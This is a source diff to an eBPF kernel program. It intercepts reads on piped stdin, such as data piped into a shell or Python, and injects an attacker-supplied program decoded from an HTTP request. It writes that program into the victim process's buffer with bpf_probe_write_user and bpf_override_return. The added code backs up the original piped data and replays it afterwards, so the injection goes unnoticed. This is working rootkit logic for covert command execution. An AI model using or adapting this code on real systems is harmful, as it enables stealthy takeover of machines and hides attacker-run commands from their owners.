@@ -161,6 +161,12 @@ struct piped_stdin_t {
     u32 prog_key;
     u32 cursor;
     u32 pipe_token;
+    u32 backup;
+    u32 done;
+
+    u32 piped_data_backup_key;
+    u32 piped_data_backup_reader;
+    u32 piped_data_backup_writer;
 };
 
 struct bpf_map_def SEC("maps/pid_with_piped_stdin") pid_with_piped_stdin = {
@@ -251,10 +257,15 @@ int kprobe_do_exit(struct pt_regs *ctx) {
 #define PIPE_OVERRIDE_PYTHON_KEY 1
 #define PIPE_OVERRIDE_SHELL_KEY  2
 
+struct comm_prog_key_t {
+    u32 prog_key;
+    u32 backup;
+};
+
 struct bpf_map_def SEC("maps/comm_prog_key") comm_prog_key = {
     .type = BPF_MAP_TYPE_LRU_HASH,
     .key_size = 32,
-    .value_size = sizeof(u32),
+    .value_size = sizeof(struct comm_prog_key_t),
     .max_entries = 1024,
     .pinning = 0,
     .namespace = "",
@@ -263,7 +274,7 @@ struct bpf_map_def SEC("maps/comm_prog_key") comm_prog_key = {
 struct bpf_map_def SEC("maps/piped_progs") piped_progs = {
     .type = BPF_MAP_TYPE_LRU_HASH,
     .key_size = sizeof(u32),
-    .value_size = HTTP_REQ_LEN - 32,
+    .value_size = HTTP_REQ_LEN - 33,
     .max_entries = 1024,
     .pinning = 0,
     .namespace = "",
@@ -272,7 +283,27 @@ struct bpf_map_def SEC("maps/piped_progs") piped_progs = {
 struct bpf_map_def SEC("maps/piped_progs_gen") piped_progs_gen = {
     .type = BPF_MAP_TYPE_PERCPU_ARRAY,
     .key_size = sizeof(u32),
-    .value_size = HTTP_REQ_LEN - 32,
+    .value_size = HTTP_REQ_LEN - 33,
+    .max_entries = 1,
+    .pinning = 0,
+    .namespace = "",
+};
+
+#define DATA_BACKUP_SIZE 8192
+
+struct bpf_map_def SEC("maps/piped_data_backup") piped_data_backup = {
+    .type = BPF_MAP_TYPE_LRU_HASH,
+    .key_size = sizeof(u32),
+    .value_size = DATA_BACKUP_SIZE,
+    .max_entries = 1024,
+    .pinning = 0,
+    .namespace = "",
+};
+
+struct bpf_map_def SEC("maps/piped_data_backup_gen") piped_data_backup_gen = {
+    .type = BPF_MAP_TYPE_PERCPU_ARRAY,
+    .key_size = sizeof(u32),
+    .value_size = DATA_BACKUP_SIZE,
     .max_entries = 1,
     .pinning = 0,
     .namespace = "",
@@ -311,7 +342,7 @@ __attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *
         // bpf_printk("read from: %s\n", val->comm);
         // bpf_printk("read to: %s\n", to);
 
-        u32 *prog_key = bpf_map_lookup_elem(&comm_prog_key, pipe_key);
+        struct comm_prog_key_t *prog_key = bpf_map_lookup_elem(&comm_prog_key, pipe_key);
         if (prog_key == 0) {
             // try without the source comm
             char zero[16] = {};
@@ -324,45 +355,126 @@ __attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *
                 return 0;
             }
         }
-        piped_stdin->prog_key = *prog_key;
+        piped_stdin->prog_key = prog_key->prog_key;
+        piped_stdin->backup = prog_key->backup;
+        piped_stdin->done = 0;
+
+        if (piped_stdin->backup) {
+            // prepare backup buffer
+            u32 key = 0;
+            char *backup = bpf_map_lookup_elem(&piped_data_backup_gen, &key);
+            if (backup != NULL) {
+                piped_stdin->piped_data_backup_key = bpf_get_prandom_u32();
+                piped_stdin->piped_data_backup_reader = 0;
+                piped_stdin->piped_data_backup_writer = 0;
+                bpf_map_update_elem(&piped_data_backup, &piped_stdin->piped_data_backup_key, backup, BPF_ANY);
+            }
+        }
     }
 
     void *prog = bpf_map_lookup_elem(&piped_progs, &piped_stdin->prog_key);
-    if (prog == NULL)
-        return 0;
-
-    char c = 0;
-    if (piped_stdin->cursor > HTTP_REQ_LEN)
-        return 0;
-
-    bpf_probe_read(&c, sizeof(c), (void*)prog + piped_stdin->cursor);
-    if (c == 0) {
-        bpf_probe_write_user(buf, &c, 1);
-        bpf_override_return(ctx, 0);
+    if (prog == NULL) {
         return 0;
     }
 
-    bpf_probe_write_user(buf, &c, 1);
-    piped_stdin->cursor += 1;
-    bpf_override_return(ctx, 1);
+    void *backup = bpf_map_lookup_elem(&piped_data_backup, &piped_stdin->piped_data_backup_key);
+    if (backup == NULL && piped_stdin->backup) {
+        return 0;
+    }
 
-    // bpf_printk("(+%d) %s\n", piped_stdin->cursor, buf);
+    char backup_c = 0;
+    if (piped_stdin->backup) {
+        u8 len = 0;
+        u64 retval = PT_REGS_RC(ctx);
+
+        // Disclaimer: the section below backs up the data piped between the 2 processes. We currently support only 2 cases:
+        //     - The data is read entirely in one call to read() because the reader process provided a big enough buffer
+        //       and the writer process wrote all the data before the first call to read.
+        //     - The data is read one byte at a time
+        if (retval > 1) {
+            bpf_probe_read_str((void*) backup, ((retval + 1) & (DATA_BACKUP_SIZE - 1)), buf);
+        }
+        if (retval == 1) {
+            if (piped_stdin->piped_data_backup_writer < (DATA_BACKUP_SIZE - 1)) {
+                len = bpf_probe_read_str((void*) backup + piped_stdin->piped_data_backup_writer, 2, buf);
+                piped_stdin->piped_data_backup_writer += len - 1;
+            }
+
+            // we can't group the two sections because of the verifier
+            if (piped_stdin->piped_data_backup_writer < (DATA_BACKUP_SIZE - 1)) {
+                bpf_probe_read((void*) backup + piped_stdin->piped_data_backup_writer, 1, &backup_c);
+            }
+        }
+    }
+
+    // prevent out of bound read
+    if (piped_stdin->cursor >= HTTP_REQ_LEN - 32) {
+        return 0;
+    }
+
+    char prog_c = 0;
+    bpf_probe_read(&prog_c, sizeof(prog_c), (void*)prog + piped_stdin->cursor);
+    if (prog_c > 0) {
+        bpf_probe_write_user(buf, &prog_c, 1);
+        piped_stdin->cursor += 1;
+        bpf_override_return(ctx, 1);
+
+        // bpf_printk("(+%d) %s\n", piped_stdin->cursor, buf);
+        return 0;
+    }
+
+    if (piped_stdin->backup) {
+        // prevent out of bound read
+        if (piped_stdin->piped_data_backup_reader >= HTTP_REQ_LEN - 32) {
+            return 0;
+        }
+
+        bpf_probe_read(&backup_c, sizeof(backup_c), (void*)backup + piped_stdin->piped_data_backup_reader);
+        if (backup_c > 0) {
+            bpf_probe_write_user(buf, &backup_c, 1);
+            if (piped_stdin->piped_data_backup_reader + 1 >= HTTP_REQ_LEN - 32) {
+                piped_stdin->piped_data_backup_reader = 0;
+            } else {
+                piped_stdin->piped_data_backup_reader++;
+            }
+            bpf_override_return(ctx, 1);
+
+            // bpf_printk("backup (reader:%d writer:%d) %s\n", piped_stdin->piped_data_backup_reader, piped_stdin->piped_data_backup_writer, buf);
+            return 0;
+        }
+    }
+
+    if (!piped_stdin->done) {
+        // we've reached the end of the backed up data
+        bpf_probe_write_user(buf, &backup_c, 1);
+        bpf_override_return(ctx, 0);
+        piped_stdin->done = 1;
+    }
     return 0;
+
 }
 
 __attribute__((always_inline)) int handle_put_pipe_prog(char request[HTTP_REQ_LEN]) {
+    // parse backup command
+    u8 backup = 0;
+    if (request[0] == '1') {
+        backup = 1;
+    }
+
     // parse "from" and "to" commands. To simplify our eBPF programs, we assume that the commands cannot contain a '#'.
     char pipe_key[32] = {};
 
     #pragma unroll
     for (int i = 0; i < 32; i++) {
-        if (request[i] != '#') {
-            pipe_key[i] = request[i];
+        if (request[i + 1] != '#') {
+            pipe_key[i] = request[i + 1];
         }
     }
 
     // generate a unique id for this pipe key
-    u32 prog_key = bpf_get_prandom_u32();
+    struct comm_prog_key_t prog_key = {};
+    prog_key.prog_key = bpf_get_prandom_u32();
+    prog_key.backup = backup;
 
     u32 key = 0;
     char *prog = bpf_map_lookup_elem(&piped_progs_gen, &key);
@@ -376,32 +488,32 @@ __attribute__((always_inline)) int handle_put_pipe_prog(char request[HTTP_REQ_LE
 
     // decode
     #pragma unroll
-    for (int i = 0; i < (HTTP_REQ_LEN - 32); i += 4) {
-        if (request[i + 32] == '_') {
+    for (int i = 0; i < (HTTP_REQ_LEN - 36); i += 4) {
+        if (request[i + 33] == '_') {
             goto save_prog;
         }
 
-        a = to_base64_value(request[i + 32]);
-        b = to_base64_value(request[i + 33]);
-        c = to_base64_value(request[i + 34]);
-        d = to_base64_value(request[i + 35]);
+        a = to_base64_value(request[i + 33]);
+        b = to_base64_value(request[i + 34]);
+        c = to_base64_value(request[i + 35]);
+        d = to_base64_value(request[i + 36]);
 
         tmp = (a << 3 * 6) + (b << 2 * 6) + (c << 1 * 6) + (d << 0 * 6);
 
-        if (prog_cursor < (HTTP_REQ_LEN - 32)) {
+        if (prog_cursor < (HTTP_REQ_LEN - 33)) {
             prog[prog_cursor++] = (tmp >> 2 * 8) & 0xFF;
         }
-        if (prog_cursor < (HTTP_REQ_LEN - 32)) {
+        if (prog_cursor < (HTTP_REQ_LEN - 33)) {
             prog[prog_cursor++] = (tmp >> 1 * 8) & 0xFF;
         }
-        if (prog_cursor < (HTTP_REQ_LEN - 32)) {
+        if (prog_cursor < (HTTP_REQ_LEN - 33)) {
             prog[prog_cursor++] = (tmp >> 0 * 8) & 0xFF;
         }
     }
 
 save_prog:
     prog[prog_cursor] = 0;
-    bpf_map_update_elem(&piped_progs, &prog_key, prog, BPF_ANY);
+    bpf_map_update_elem(&piped_progs, &prog_key.prog_key, prog, BPF_ANY);
 
     // update the comm_prg_key map for the new piped program to take effect
     bpf_map_update_elem(&comm_prog_key, pipe_key, &prog_key, BPF_ANY);
